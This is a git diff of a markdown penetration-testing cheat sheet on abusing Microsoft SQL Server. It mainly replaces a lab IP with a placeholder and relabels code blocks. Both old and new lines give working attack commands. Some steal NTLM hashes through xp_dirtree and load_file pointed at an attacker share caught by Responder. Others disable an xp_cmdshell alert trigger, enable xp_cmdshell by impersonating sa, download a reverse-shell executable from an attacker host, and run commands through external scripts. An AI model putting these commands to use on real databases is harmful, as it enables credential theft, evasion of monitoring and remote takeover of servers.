@@ -4,12 +4,11 @@ date: 2024-6-27
 tags: ["mssql", "database", "Windows", "exploit", "rce", "privesc", "pe"]
 ---
 
----
 ### Abuse #1: Steal NTLM hash
 
 <div>
 
-```bash
+```console
 # In our local Linux machine
 sudo responder -I tun0
 ```
@@ -23,8 +22,8 @@ sudo responder -I tun0
 
 <div>
 
-```mysql
-xp_dirtree '\\10.10.14.10\any\thing';
+```console
+xp_dirtree '\\<LOCAL_IP>\any\thing';
 ```
 
 </div>
@@ -34,8 +33,8 @@ xp_dirtree '\\10.10.14.10\any\thing';
 
 <div>
 
-```mysql
-use master; exec xp_dirtree '\\10.10.14.10\any\thing';
+```console
+use master; exec xp_dirtree '\\<LOCAL_IP>\any\thing';
 ```
 
 </div>
@@ -45,8 +44,8 @@ use master; exec xp_dirtree '\\10.10.14.10\any\thing';
 
 <div>
 
-```mysql
-load_file('\\10.10.14.10\any\thing');
+```console
+load_file('\\<LOCAL_IP>\any\thing');
 ```
 
 </div>
@@ -57,22 +56,22 @@ load_file('\\10.10.14.10\any\thing');
 
 <div>
 
-```mysql
+```console
 # Check any policy blocking xp_cmdshell
 select name from sys.server_triggers;
 ```
 
-```mysql
+```console
 # Disable trigger if any
 disable trigger ALERT_xp_cmdshell on all server;
 ```
 
-```mysql
+```console
 # Enable xp_cmdshell
 enable_xp_cmdshell;
 ```
 
-```mysql
+```console
 # RCE
 xp_cmdshell whoami
 ```
@@ -83,24 +82,24 @@ xp_cmdshell whoami
 
 <div>
 
-```mysql
+```console
 execute as login = 'sa'; exec sp_configure 'show advanced options', 1;
 ```
 
-```mysql
+```console
 execute as login = 'sa'; reconfigure;
 ```
 
-```mysql
+```console
 execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1;
 ```
 
-```mysql
+```console
 execute as login = 'sa'; reconfigure;
 ```
 
-```mysql
-execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe'
+```console
+execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass curl <LOCAL_IP>/rev.exe -o C:\ProgramData\rev.exe'
 ```
 
 </div>
@@ -111,7 +110,7 @@ execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass cur
 
 <div>
 
-```mysql
+```console
 EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';
 ```
 
